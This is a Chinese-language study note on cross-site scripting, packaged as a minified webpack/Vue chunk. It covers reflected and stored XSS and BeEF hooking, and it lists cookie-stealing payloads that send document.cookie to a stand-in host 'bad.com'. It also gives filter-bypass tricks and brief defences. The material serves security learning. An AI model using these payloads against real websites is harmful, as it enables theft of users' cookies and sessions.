(window.webpackJsonp=window.webpackJsonp||[]).push([[173],{1222:function(v,_){const e={render:function(){var v=this;v.$createElement;return v._self._c,v._m(0)},staticRenderFns:[function(){var v=this,_=v.$createElement,e=v._self._c||_;return e("div",{staticClass:"frontmatter-markdown"},[e("h2",{attrs:{id:"前言"}},[v._v("前言")]),v._v(" "),e("p",[v._v("本文是观看"),e("a",{attrs:{href:"https://www.bilibili.com/video/BV1g4411Y7Y4/"}},[v._v("此视频")]),v._v("时的笔记")]),v._v(" "),e("h2",{attrs:{id:"原理"}},[v._v("原理")]),v._v(" "),e("ul",[e("li",[v._v("XSS：Cross Site Scripting, 跨域脚本")]),v._v(" "),e("li",[v._v("攻击客户端，而不是服务器")]),v._v(" "),e("li",[v._v("可以用来获取 Cookie")]),v._v(" "),e("li",[v._v("如果服务器没有对用户提交的文本数据进行过滤或转义，用户就可以提交 JS 脚本，使其他用户在浏览器上执行此脚本")]),v._v(" "),e("li",[v._v("类型\n"),e("ul",[e("li",[v._v("反射型")]),v._v(" "),e("li",[v._v("存储型")])])])]),v._v(" "),e("h2",{attrs:{id:"反射型"}},[v._v("反射型")]),v._v(" "),e("ul",[e("li",[v._v("不会被存到服务器")]),v._v(" "),e("li",[v._v("通过 URL 重写网页内容")]),v._v(" "),e("li",[v._v("然后把 URL 发给其他用户，其他用户打开之后会中招")])]),v._v(" "),e("h2",{attrs:{id:"存储型"}},[v._v("存储型")]),v._v(" "),e("ul",[e("li",[v._v("会存到服务器")]),v._v(" "),e("li",[v._v("其他用户访问到这些数据时就会中招")])]),v._v(" "),e("h2",{attrs:{id:"常用标签"}},[v._v("常用标签")]),v._v(" "),e("ul",[e("li",[e("code",{pre:!0},[v._v("iframe")]),v._v(" "),e("ul",[e("li",[v._v("可以用来加载一个网页，使用户混淆页面")]),v._v(" "),e("li",[v._v("也可以把 iframe 的大小设置为很小，隐蔽地加载一个页面")]),v._v(" "),e("li",[v._v("也可以用来收集 Cookie: "),e("code",{pre:!0},[v._v("<iframe src=\"'http://bad.com?cookie=' + document.cookie\" />")])])])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("script")]),v._v(" "),e("ul",[e("li",[v._v("重定向 URL，比如"),e("code",{pre:!0},[v._v("window.location = xxx.com")])]),v._v(" "),e("li",[v._v("弹出提示："),e("code",{pre:!0},[v._v("alert('网站升级，请使用我们的新网站：xxx.com')")])]),v._v(" "),e("li",[v._v("获取 Cookie: "),e("code",{pre:!0},[v._v("document.cookie")])]),v._v(" "),e("li",[v._v("发送 Cookie\n"),e("ul",[e("li",[e("code",{pre:!0},[v._v("window.open('bad.com?cookie=' + document.cookie)")])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("document.location = 'bad.com?cookie=' + document.cookie")])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("new Image().src='bad.com?cookie=' + document.cookie; img.width = img.height = 0")])])])])])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("textarea")])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("img")]),v._v(" "),e("ul",[e("li",[e("code",{pre:!0},[v._v("<img src=\"#\" onerror=alert('xss') />")])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("<img src=\"javascript:alert('xss')\" />")])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v('<img src="http://heef-ip:3000/hook.js" />')])]),v._v(" "),e("li",[e("code",{pre:!0},[v._v("<img src=\"'http://bad.com?cookie=' + document.cookie\">")])])])])]),v._v(" "),e("h2",{attrs:{id:"自动-xss"}},[v._v("自动 XSS")]),v._v(" "),e("p",[v._v("使用 BeEF 工具："),e("a",{attrs:{href:"https://beefproject.com"}},[v._v("Browser Exploitation Framework")])]),v._v(" "),e("ul",[e("li",[v._v("基于 Ruby 开发，有 GUI")]),v._v(" "),e("li",[v._v("信息收集\n"),e("ul",[e("li",[v._v("网络发现")]),v._v(" "),e("li",[v._v("主机信息")]),v._v(" "),e("li",[v._v("Cookie 获取")]),v._v(" "),e("li",[v._v("会话劫持")]),v._v(" "),e("li",[v._v("键盘记录")]),v._v(" "),e("li",[v._v("插件信息")])])]),v._v(" "),e("li",[v._v("持久化控制\n"),e("ul",[e("li",[v._v("弹窗")]),v._v(" "),e("li",[v._v("小窗口")]),v._v(" "),e("li",[v._v("中间人")])])]),v._v(" "),e("li",[v._v("社会工程\n"),e("ul",[e("li",[v._v("点击劫持")]),v._v(" "),e("li",[v._v("弹窗告警")]),v._v(" "),e("li",[v._v("虚假页面")]),v._v(" "),e("li",[v._v("钓鱼页面")])])]),v._v(" "),e("li",[v._v("渗透\n"),e("ul",[e("li",[v._v("内网渗透")]),v._v(" "),e("li",[v._v("Metasploit")]),v._v(" "),e("li",[v._v("CSRF")]),v._v(" "),e("li",[v._v("DDOS")])])])]),v._v(" "),e("p",[v._v("只要把"),e("code",{pre:!0},[v._v("http://ip:port/hook.js")]),v._v("成功注入即可")]),v._v(" "),e("p",[v._v("命令颜色：")]),v._v(" "),e("ul",[e("li",[v._v("绿色：生效且不会被发现")]),v._v(" "),e("li",[v._v("橙色：生效，但可能被发现")]),v._v(" "),e("li",[v._v("灰色：未必生效")]),v._v(" "),e("li",[v._v("红色：不生效")])]),v._v(" "),e("h2",{attrs:{id:"绕过简单检测"}},[v._v("绕过简单检测")]),v._v(" "),e("ul",[e("li",[v._v("使用大小写不确定的标签："),e("code",{pre:!0},[v._v("<ScRiPt>xxx<\/sCrIpT>")])]),v._v(" "),e("li",[v._v("使用 URL/Base64/Unicode 等编码")])]),v._v(" "),e("h2",{attrs:{id:"防护"}},[v._v("防护")]),v._v(" "),e("ul",[e("li",[v._v("对用户提交的文本进行过滤或转义")]),v._v(" "),e("li",[v._v("不要把用户提交的文本作为 inner HTML")])])])}]};v.exports={attributes:{title:"Security-5",description:"XSS"},vue:{render:e.render,staticRenderFns:e.staticRenderFns,component:{data:function(){return{templateRender:null}},render:function(v){return this.templateRender?this.templateRender():v("div","Rendering")},created:function(){this.templateRender=e.render,this.$options.staticRenderFns=e.staticRenderFns}}}}}}]);